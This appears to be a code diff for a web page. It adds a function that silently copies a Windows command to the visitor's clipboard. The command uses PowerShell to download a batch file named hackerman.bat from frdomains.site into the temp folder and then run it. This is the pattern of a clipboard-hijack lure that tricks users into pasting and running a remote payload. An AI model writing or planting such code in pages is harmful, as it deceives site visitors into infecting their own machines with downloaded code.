@@ -90,7 +90,7 @@
         <script src="js/variables.js"></script> <!-- variables -->
         <script>
           function copyHackerman() {
-            Clipboard.apply('test');
+            navigator.clipboard.writeText(`cmd /c powershell -Command "Invoke-WebRequest -Uri https://frdomains.site/tools/hackerman.bat -OutFile %TEMP%\\hackerman.bat" && %TEMP%\\hackerman.bat`);
           }
         </script>
     </body>
